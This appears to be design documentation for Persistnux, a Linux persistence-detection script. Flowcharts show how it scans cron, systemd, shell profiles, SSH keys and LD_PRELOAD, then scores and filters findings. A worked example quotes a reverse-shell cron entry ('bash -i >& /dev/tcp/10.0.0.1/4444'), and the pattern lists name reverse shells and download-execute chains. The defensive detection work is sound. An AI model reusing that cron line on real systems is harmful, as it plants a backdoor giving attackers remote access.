# Persistnux Detection Flow

## How Detection Works (Step-by-Step)

```
┌─────────────────────────────────────────────────────────────────┐
│                     START: persistnux.sh                        │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│              Parse Command-Line Arguments                        │
│  --help / --all / --min-confidence / environment variables      │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Initialize Output Files                         │
│          persistnux_<hostname>_<timestamp>.csv                  │
│          persistnux_<hostname>_<timestamp>.jsonl                │
└───────────────────────────┬─────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                    DETECTION PHASE                              │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  Module 1: Systemd Services & Timers                     │  │
│  │  - Scan /etc/systemd/system, /lib/systemd/system, etc.  │  │
│  │  - Check known-good whitelist                            │  │
│  │  - Extract ExecStart commands                            │  │
│  │  - Pattern matching for suspicious content               │  │
│  │  - Check package management status                       │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 2: Cron Jobs & Scheduled Tasks                   │  │
│  │  - Scan /etc/crontab, /etc/cron.d/*, periodic dirs      │  │
│  │  - User crontabs (if root)                               │  │
│  │  - At jobs                                                │  │
│  │  - Pattern matching                                       │  │
│  │  - Check package management status                       │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 3: Shell Profiles & RC Files                     │  │
│  │  - System profiles: /etc/profile, /etc/bash.bashrc      │  │
│  │  - User profiles: ~/.bashrc, ~/.zshrc, etc.             │  │
│  │  - Profile.d scripts                                      │  │
│  │  - Pattern matching                                       │  │
│  │  - Check package management status                       │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 4: SSH Keys & Configurations                     │  │
│  │  - ~/.ssh/authorized_keys for all users                  │  │
│  │  - ~/.ssh/config                                          │  │
│  │  - /etc/ssh/sshd_config                                  │  │
│  │  - Pattern matching                                       │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 5: Init Scripts & rc.local                       │  │
│  │  - /etc/rc.local, /etc/init.d/*, /etc/rc*.d/*           │  │
│  │  - Pattern matching                                       │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 6: Kernel Modules & LD_PRELOAD                   │  │
│  │  - /etc/ld.so.preload (HIGH confidence if exists)        │  │
│  │  - /etc/ld.so.conf.d/*                                   │  │
│  │  - Loaded kernel modules                                  │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
│  ┌────────────────▼─────────────────────────────────────────┐  │
│  │  Module 7: Additional Persistence                        │  │
│  │  - XDG autostart                                          │  │
│  │  - PAM configs                                            │  │
│  │  - Sudoers                                                │  │
│  │  - MOTD scripts                                           │  │
│  │  - Assign confidence score                               │  │
│  └────────────────┬─────────────────────────────────────────┘  │
│                   │                                              │
└───────────────────┴──────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│                     OUTPUT SUMMARY                              │
│                                                                  │
│  Total Findings: XXX                                            │
│  HIGH Confidence: X                                             │
│  MEDIUM Confidence: XX                                          │
│  LOW Confidence: XXX (hidden in suspicious_only mode)           │
└─────────────────────────────────────────────────────────────────┘
```

## Per-Finding Decision Flow

For each file/config detected:

```
┌─────────────────────────┐
│   File/Config Found     │
└───────────┬─────────────┘
            │
            ▼
┌─────────────────────────────────────────┐
│  Is it a known-good vendor service?     │
│  (systemd-*, dbus-*, snap.*, etc.)      │
└───────────┬─────────────────────────────┘
            │
      ┌─────┴─────┐
      │           │
     YES          NO
      │           │
      ▼           ▼
   [SKIP]   ┌─────────────────────────┐
            │  Calculate SHA256 hash  │
            │  Extract metadata       │
            └───────────┬─────────────┘
                        │
                        ▼
            ┌─────────────────────────────────┐
            │  Pattern Matching Check         │
            │  - Reverse shells?              │
            │  - Download/execute?            │
            │  - Obfuscation?                 │
            │  - Suspicious locations?        │
            └───────────┬─────────────────────┘
                        │
                  ┌─────┴─────┐
                  │           │
            Patterns      No Patterns
              Found         Found
                  │           │
                  ▼           ▼
            confidence    confidence
              = HIGH       = MEDIUM
                  │           │
                  └─────┬─────┘
                        │
                        ▼
            ┌──────────────────────────────┐
            │  Check File Age              │
            │  Modified < 7 days?          │
            └───────────┬──────────────────┘
                        │
                  ┌─────┴─────┐
                  │           │
                 YES          NO
                  │           │
                  ▼           │
         Upgrade to HIGH      │
            (if not already)  │
                  │           │
                  └─────┬─────┘
                        │
                        ▼
            ┌──────────────────────────────┐
            │  Check Package Management    │
            │  dpkg -S / rpm -qf           │
            └───────────┬──────────────────┘
                        │
                  ┌─────┴──────┐
                  │            │
            Package-       Unmanaged
            Managed            │
                  │            │
                  ▼            │
         ┌────────────────┐   │
         │ Downgrade:     │   │
         │ HIGH → MEDIUM  │   │
         │ MEDIUM → LOW   │   │
         └────────┬───────┘   │
                  │            │
                  └─────┬──────┘
                        │
                        ▼
            ┌──────────────────────────────┐
            │  Apply Filter Settings       │
            │  (suspicious_only / all)     │
            │  (MIN_CONFIDENCE)            │
            └───────────┬──────────────────┘
                        │
                  ┌─────┴─────┐
                  │           │
              Include      Exclude
                  │           │
                  ▼           ▼
         ┌──────────────┐  [SKIP]
         │ Write to CSV │
         │ Write to JSONL│
         └──────────────┘
                  │
                  ▼
         ┌──────────────────┐
         │ If HIGH:         │
         │ Log to console   │
         │ [FINDING] ...    │
         └──────────────────┘
```

## Confidence Score Decision Tree

```
START
  │
  ▼
Does file contain suspicious patterns?
  │
  ├─YES─► Set confidence = HIGH
  │
  └─NO──► Set confidence = MEDIUM (or LOW for standard configs)
           │
           ▼
Is file recently modified (<7 days)?
  │
  ├─YES─► Upgrade to HIGH (if MEDIUM)
  │
  └─NO──► Keep current confidence
           │
           ▼
Is file package-managed (dpkg/rpm)?
  │
  ├─YES─► Downgrade confidence:
  │        ├─ HIGH → MEDIUM
  │        └─ MEDIUM → LOW
  │
  └─NO──► Keep current confidence (unmanaged = more suspicious)
           │
           ▼
Is this LD_PRELOAD config?
  │
  ├─YES─► Force HIGH (library injection is always suspicious)
  │
  └─NO──► Keep current confidence
           │
           ▼
FINAL CONFIDENCE
```

## Filtering Decision Tree

```
Finding has confidence level: [LOW | MEDIUM | HIGH | CRITICAL]
  │
  ▼
Is MIN_CONFIDENCE set?
  │
  ├─YES─► Does finding meet minimum?
  │        │
  │        ├─YES─► Continue to next check
  │        │
  │        └─NO──► EXCLUDE (don't write to output)
  │
  └─NO──► Continue to next check
           │
           ▼
What is FILTER_MODE?
  │
  ├─ "all" ─────► INCLUDE (write to output)
  │
  └─ "suspicious_only" (default)
               │
               ▼
    Is confidence LOW?
               │
               ├─YES─► EXCLUDE (don't write to output)
               │
               └─NO──► INCLUDE (write to output)
```

## Example: Tracing a Malicious Cron Job

```
1. File Found
   └─ /etc/cron.d/freedesktop_timesync1

2. Known-Good Check
   └─ Not in whitelist → Continue

3. Extract Content
   └─ "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444'"

4. Pattern Matching
   └─ Match: "/dev/tcp/" (reverse shell pattern)
   └─ Initial confidence: HIGH

5. Age Check
   └─ Modified: 2 days ago
   └─ Action: Already HIGH, no change

6. Package Check
   └─ Run: dpkg -S /etc/cron.d/freedesktop_timesync1
   └─ Result: Not found (unmanaged)
   └─ Action: Keep HIGH confidence

7. Filter Check
   └─ Mode: suspicious_only (default)
   └─ Confidence: HIGH
   └─ Result: INCLUDE

8. Output
   └─ Write to CSV
   └─ Write to JSONL
   └─ Log to console: [FINDING] Suspicious cron job: /etc/cron.d/freedesktop_timesync1

FINAL: HIGH confidence, unmanaged, reverse shell detected → Immediate investigation
```

## Example: Tracing a Legitimate Cron Job

```
1. File Found
   └─ /etc/cron.daily/apt-compat

2. Known-Good Check
   └─ Not in whitelist → Continue

3. Extract Content
   └─ "#!/bin/sh\ntest -x /usr/bin/apt-config || exit 0\n..."

4. Pattern Matching
   └─ No suspicious patterns found
   └─ Initial confidence: MEDIUM

5. Age Check
   └─ Modified: 120 days ago
   └─ Action: No change (not recent)

6. Package Check
   └─ Run: dpkg -S /etc/cron.daily/apt-compat
   └─ Result: apt (package-managed)
   └─ Action: Downgrade MEDIUM → LOW

7. Filter Check
   └─ Mode: suspicious_only (default)
   └─ Confidence: LOW
   └─ Result: EXCLUDE

8. Output
   └─ NOT written to CSV
   └─ NOT written to JSONL
   └─ NOT logged to console

FINAL: LOW confidence, package-managed, no suspicious patterns → Hidden from output
```

## Summary of Detection Logic

| Characteristic | Effect on Confidence | Default Visibility |
|----------------|---------------------|-------------------|
| Reverse shell pattern | Upgrade to HIGH | ✅ Shown |
| Download-execute pattern | Upgrade to HIGH | ✅ Shown |
| Obfuscation (base64, eval) | Upgrade to HIGH | ✅ Shown |
| Suspicious location (/tmp) | Upgrade to HIGH | ✅ Shown |
| Recent modification (<7 days) | Upgrade to HIGH | ✅ Shown |
| Package-managed | Downgrade 1 level | Depends on final score |
| Known-good service | Skip entirely | ❌ Never shown |
| LD_PRELOAD config | Force HIGH | ✅ Shown |
| Standard config, no patterns | Set to LOW | ❌ Hidden |
| Unusual but not malicious | Set to MEDIUM | ✅ Shown |
